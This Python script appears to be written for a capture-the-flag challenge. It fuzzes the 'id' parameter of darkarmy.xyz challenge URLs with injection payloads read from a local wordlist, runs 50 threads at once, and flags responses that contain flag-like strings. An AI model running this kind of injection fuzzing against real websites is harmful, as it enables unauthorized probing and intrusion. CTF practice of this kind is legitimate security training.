import re 
import requests
import concurrent.futures 

#url="http://sosimple.darkarmy.xyz/?id="
url="http://web.darkarmy.xyz:30001/?id="
#url="http://simplesql.darkarmy.xyz/?id="
def dark(id):
    r = requests.get(url+str(id))
    if "Try to fix" not in r.text:
        pass
        #print(id , len(r.text))
    l = ["CTF", "ctf" , "dark" , "Dark"]
    for i in l: 
        if i in r.text:
            print("\n\nmatch found  {}\n\n".format(id))
    return r

def main():
    fp = open("/home/prashanth/Music/resourse/mynotes/injection.txt" , "r")
    names = [i for i in range(1000)]
    names = fp.read().split()
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    # Start the load operations and mark each future with its URL
        future_to_url= {}
        for name in names:
            future_to_url[executor.submit(dark, name)] = name
        #future_to_url = {executor.submit(find_user, name): name for name in names }
        for future in concurrent.futures.as_completed(future_to_url):
            name = future_to_url[future]
            try:
                data = future.result()
            except Exception as exc:
                print('%r generated an exception: %s' % (name, exc))
            #else:
            #    print('%r page is %d bytes' % (name, len(data)))


if __name__ == '__main__':
    main()
